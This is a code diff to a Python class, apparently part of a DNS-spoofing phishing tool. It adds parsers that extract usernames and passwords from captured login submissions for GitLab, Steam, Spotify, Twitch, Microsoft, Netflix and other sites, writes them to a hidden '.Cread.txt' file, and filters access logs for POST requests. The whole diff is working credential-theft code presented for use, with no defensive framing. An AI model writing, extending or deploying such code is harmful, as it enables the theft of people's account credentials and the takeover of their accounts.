@@ -44,7 +44,8 @@ class dns_result :
                          line_cread_1  = unquote(rego[1][:-7])
                          line_cread_2  = unquote(rego[3][:-2])
                     elif "username=" in line:
-                          #create-gitlabe-steam-spotify
+
+                          #create-gitlabe-steam-spotify-twitch
                           rego = str(re.findall("username.+",line)).split("&") 
                           if "commit=Sign+in']" in rego:
                               line_cread_1 = unquote(rego[0][11:])
@@ -57,7 +58,8 @@ class dns_result :
                               line_cread_2 = unquote(rego[1][9:]) 
                           else:    
                               line_cread_1 =unquote(rego[0][11:])
-                              line_cread_2  = unquote(rego[1][9:-2])                              
+                              line_cread_2  = unquote(rego[1][9:-2])  
+
                     elif "IsFidoSupported=" in line : 
                           #microsoft
                           rego = str("".join(re.findall("[^=]",line))).split("&")
@@ -69,9 +71,13 @@ class dns_result :
                           if "&pageId" in line: 
                               line_cread_1  = unquote(rego[1][:-9])
                               line_cread_2  = unquote(rego[2][:-7])
+                          elif "Y&customerType" in rego:
+                               line_cread_1  = unquote(rego[1][:-9])
+                               line_cread_2  = unquote(rego[2][:-13])
                           else:    
                               line_cread_1  = unquote(rego[1][:-9])
                               line_cread_2  = unquote(rego[2][:-11]) 
+                             
                     elif "Cemail&authURL" in line :
                           #netflax
                           rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=') 
@@ -85,7 +91,11 @@ class dns_result :
                     elif "&redirect=&login=" in line :
                           rego = str(re.findall("[&login=]\D+\S%40+.+",line)).split('=')
                           line_cread_1  = unquote(rego[2][:-9])
-                          line_cread_2  = unquote(rego[3][:-21])            
+                          line_cread_2  = unquote(rego[3][:-21])  
+                    elif "&_origin=" in line :
+                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
+                          line_cread_1  = unquote(rego[1][:-5])
+                          line_cread_2  = unquote(rego[-1][:-2])             
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                         if line_cread_1 == "":
                               Cread_User.write("---------"+'\n'+line_cread_2.replace("%40",'@')+'\n')
@@ -98,7 +108,7 @@ class dns_result :
                 with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                         accesslog = accesslog.readlines()#[-243:]
                 for line1 in accesslog:    
-                      if "POST"  or "GET"in line1:
+                      if "POST" in line1:
                           self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                           .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                           if self.domain_web not in  list_web:
